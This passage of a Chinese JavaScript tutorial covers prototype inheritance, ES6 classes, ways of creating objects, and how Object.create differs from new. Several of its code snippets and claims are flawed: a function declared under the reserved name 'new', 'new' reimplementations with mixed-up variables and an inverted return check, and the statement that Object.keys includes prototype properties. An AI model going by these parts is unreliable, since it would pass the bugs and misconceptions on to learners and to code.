  <span class="token keyword">var</span> pPrototype <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>parent<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建对象</span>
  pPrototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> child<span class="token punctuation">;</span><span class="token comment">//增强对象;修改指向；</span>
  child<span class="token punctuation">.</span>prototype <span class="token operator">=</span> pPrototype<span class="token punctuation">;</span><span class="token comment">//指定对象</span>
<span class="token comment">// Student.prototype = Object.create(Person.prototype)//要点</span>
<span class="token comment">// Student.prototype.constructor = Student//要点</span>
<span class="token punctuation">}</span>
<span class="token comment">/**
总共调用了两次Parent构造；(组合继承调用了两次，寄生组合调用了一次，区别就是【Object.create 和 new 区别】)
在第一次调用Parent构造函数时，Child.prototype会得到两个属性： name和age； 他们都是Parent的实例属性，只不过现在位于Child的原型中。
当调用Child构造函数时，又会调用一次Parent构造函数，这一次又在新对象上创建了实例属性name和age。
于是这两个属性就屏蔽了原型中的两个同名属性。
*/</span>
<span class="token comment">//Student.prototype = new Person()</span>
<span class="token comment">//Student.prototype.constructor = Student//组合继承也是需要修复构造函数指向的</span>
<span class="token comment">//Student.prototype.sayHello = function () { }</span>

<span class="token comment">// 借助原型可以基于已有的对象来创建对象，var B = Object.create(A)以A对象为原型，生成了B对象。B继承了A的所有属性和方法。</span>
<span class="token comment">// Student.prototype = Person.prototype</span>
<span class="token comment">// Student.prototype.constructor = Student//组合继承也是需要修复构造函数指向的</span>
<span class="token comment">// 可以把这三个要点封装成方法；</span>
<span class="token comment">// Student.prototype = Object.create(Person.prototype)//要点</span>
<span class="token comment">// Student.prototype.constructor = Student//要点</span>
<span class="token function">inheritPrototype</span><span class="token punctuation">(</span>Student<span class="token punctuation">,</span>Person<span class="token punctuation">)</span>
<span class="token keyword">var</span> s1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">'Samy'</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">15000</span><span class="token punctuation">)</span><span class="token comment">// 同样的，Student继承了所有的Person原型对象的属性和方法。目前来说，最完美的继承方法！</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1 <span class="token keyword">instanceof</span> <span class="token class-name">Student</span><span class="token punctuation">,</span> s1 <span class="token keyword">instanceof</span> <span class="token class-name">Person</span><span class="token punctuation">)</span> <span class="token comment">// true true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>constructor<span class="token punctuation">)</span> <span class="token comment">//[Function: Student]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token comment">//Student { name: 'Samy', age: 20, price: 15000, setScore: [Function] }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//调用类的构造方法</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age
  <span class="token punctuation">}</span>
  <span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//定义一般的方法</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;调用父类的方法&quot;</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'kobe'</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token comment">//Person { name: 'kobe', age: 39 }</span>

<span class="token comment">//定义一个子类</span>
<span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> salary</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary
  <span class="token punctuation">}</span>
  <span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//在子类自身定义方法</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;调用子类的方法&quot;</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//wade 38 1000000000</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> s1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">'wade'</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">1000000000</span><span class="token punctuation">)</span>
<span class="token keyword">let</span> s2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token string">'kobe'</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">3000000000</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">.</span>showName <span class="token operator">===</span> s2<span class="token punctuation">.</span>showName<span class="token punctuation">)</span><span class="token comment">//true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token comment">//Student { name: 'wade', age: 38, salary: 1000000000 }</span>
s1<span class="token punctuation">.</span><span class="token function">showName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><h3 id="对象-类"><a href="#对象-类" class="header-anchor">#</a> 对象/类</h3> <h4 id="_1-创建实例的方法"><a href="#_1-创建实例的方法" class="header-anchor">#</a> 1:创建实例的方法</h4> <h5 id="字面量"><a href="#字面量" class="header-anchor">#</a> 字面量</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> obj<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">}</span>

<span class="token keyword">var</span> test1 <span class="token operator">=</span> <span class="token punctuation">{</span>x<span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">345</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{x:123,y:345};</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//123</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x <span class="token operator">===</span> test1<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h5 id="object构造函数创建-new"><a href="#object构造函数创建-new" class="header-anchor">#</a> <strong>Object构造函数创建</strong>(new)</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> Obj<span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
Obj<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">'张三'</span>

<span class="token keyword">var</span> test2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">{</span>x<span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">345</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//跟{}一致；</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{x:123,y:345}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test2<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//123</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test2<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test2<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x <span class="token operator">===</span> test2<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h5 id="使用工厂模式创建对象-new"><a href="#使用工厂模式创建对象-new" class="header-anchor">#</a> 使用工厂模式创建对象(new)</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 o<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
 <span class="token keyword">return</span> o<span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
<span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token function">createPerson</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h5 id="obejct-create内置方法"><a href="#obejct-create内置方法" class="header-anchor">#</a> Obejct.create内置方法</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> test3 <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>x<span class="token operator">:</span><span class="token number">123</span><span class="token punctuation">,</span>y<span class="token operator">:</span><span class="token number">345</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{}//注意这里。只是继承原型属性；所以有原型属性；</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test3<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//123</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test3<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//123</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test3<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>x <span class="token operator">===</span> test3<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h5 id="使用构造函数创建对象-new"><a href="#使用构造函数创建对象-new" class="header-anchor">#</a> 使用构造函数创建对象(new)</h5> <p>构造函数不需要显示的返回值。使用new来创建对象(调用构造函数)时，<strong>如果return的是非对象(数字、字符串、布尔类型等)会忽而略返回值</strong>; 如果return的是对象，则返回该对象(注：若return null也会忽略返回值）。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
 <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> person1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Person { name: '张三' }</span>

<span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
  <span class="token keyword">return</span> name<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'samy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Person { name: 'samy' }</span>

<span class="token keyword">function</span> <span class="token function">Person2</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name
  <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person2</span><span class="token punctuation">(</span><span class="token string">'samy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h4 id="_2-原形链及获取"><a href="#_2-原形链及获取" class="header-anchor">#</a> 2:原形链及获取</h4> <blockquote><p><strong>由于 <code>__proto__</code> 的性能问题和兼容性问题，不推荐使用(之前旧版本，现在没有问题)。</strong></p></blockquote> <p><strong>推荐</strong></p> <ul><li>使用 <code>Object.getPrototypeOf</code> 获取原型属性;</li> <li>通过 <code>Object.setPrototypeOf</code> 修改原型属性;</li> <li>通过 <code>Object.create()</code> 继承原型;</li> <li><code>for in</code> 和 <code>Object.keys</code> 会调用原型属性;</li> <li>不调用不可枚举属性;</li> <li>isPrototypeOf 和 hasOwnProperty;</li></ul> <p><img src="/rat-summ/assets/img/18-40-43-1624025677546.4e845176.jpg" alt="18-40-43"></p> <h4 id="_3-object-create-和-new"><a href="#_3-object-create-和-new" class="header-anchor">#</a> 3:Object.create 和 new</h4> <h5 id="两者实现上的区别"><a href="#两者实现上的区别" class="header-anchor">#</a> 两者实现上的区别</h5> <ul><li><p>Object.create 是创建<strong>一个新对象</strong>，使用现有的对象来提供新创建对象的 <em>proto</em>。意思就是<strong>生成一个新对象，该新对象的 <em>proto</em>（原型） 指向现有对象</strong>。</p></li> <li><p>new 生成的是<strong>构造函数的一个实例</strong>，实例<strong>继承了构造函数及其 prototype（原型属性）上的属性和方法</strong>。 （new比上面Object.create的实现，多了一步call的实现）</p></li></ul> <h5 id="object-create原理解析实现"><a href="#object-create原理解析实现" class="header-anchor">#</a> Object.create原理解析实现</h5> <p><code>x.__proto__</code> 等同于 <code>Object.setPrototypeOf(x, P.prototype)</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Object<span class="token punctuation">.</span><span class="token function-variable function">create</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">//return { '__proto__': obj};//方式一：简洁；</span>
  <span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">//方式二；</span>
  target<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> obj
  <span class="token keyword">return</span> target
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">//Object.setPrototypeOf(obj, P.prototype) // 将对象与构造函数原型链接起来</span>
<span class="token comment">//obj.__proto__ = P.prototype // 等价于上面的写法</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h5 id="new原理解析实现"><a href="#new原理解析实现" class="header-anchor">#</a> new原理解析实现</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//方式一：</span>
<span class="token keyword">var</span> o <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> oc <span class="token operator">=</span> <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//方式二：</span>
<span class="token keyword">var</span> o  <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">//创建一个空对象</span>
o<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token class-name">Base</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span><span class="token comment">//使用现有的对象来提供新创建对象的 _proto_</span>
<span class="token keyword">var</span> oc <span class="token operator">=</span> <span class="token function">Base</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//继承原对象属性和方法</span>
<span class="token keyword">return</span> oc <span class="token keyword">instanceof</span> <span class="token class-name">Object</span> <span class="token operator">?</span> oc <span class="token operator">:</span> o

<span class="token keyword">function</span> <span class="token keyword">new</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token constant">P</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">P</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token constant">P</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
  <span class="token keyword">return</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">Object</span> <span class="token operator">?</span> o <span class="token operator">:</span> obj
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">myNew</span> <span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> <span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">// 第一步：创建一个空对象</span>
    obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span>  fn<span class="token punctuation">.</span>prototype<span class="token comment">// 第二步：继承构造函数的原型</span>
    <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token comment">// 第三步：this指向obj，并调用构造函数</span>
    <span class="token keyword">return</span> obj <span class="token comment">// 第四步：返回对象</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>示例：以下示例等同； 直接变成立即执行的函数；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// let p = new Person()//下面等同于；</span>
<span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
    obj <span class="token operator">=</span> <span class="token function">Person</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>
    <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><blockquote><h4 id="说一下-new-的过程"><a href="#说一下-new-的过程" class="header-anchor">#</a> 说一下 new 的过程？</h4></blockquote> <ol><li>创建一个空对象</li> <li>新对象的<code>__proto__</code>指向构造函数的 <code>prototype</code></li> <li><strong>绑定 <code>this</code>，指向构造方法</strong>；这一步重要；</li> <li>返回新对象</li></ol> <h5 id="案例比较分析【要点】"><a href="#案例比较分析【要点】" class="header-anchor">#</a> 案例比较分析【要点】</h5> <p>以下是用函数的示例比较。跟最开始的创建实例方法创建的方式有不一样(new Object())；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
a<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">sayName</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;--sayName--&quot;</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> a1 <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
<span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">//对象 a1 的 _proto_ 指向 a.prototype， 只继承了 a 的原型方法 sayName</span>
<span class="token comment">//a2 是构造函数 a 的实例，继承了构造函数 a 的属性 name及其 prototype（原型） 的原型方法 sayName</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> a<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//undefined 注意这里；</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a1<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//--sayName-- undefined</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> a<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//--sayName-- undefined</span>
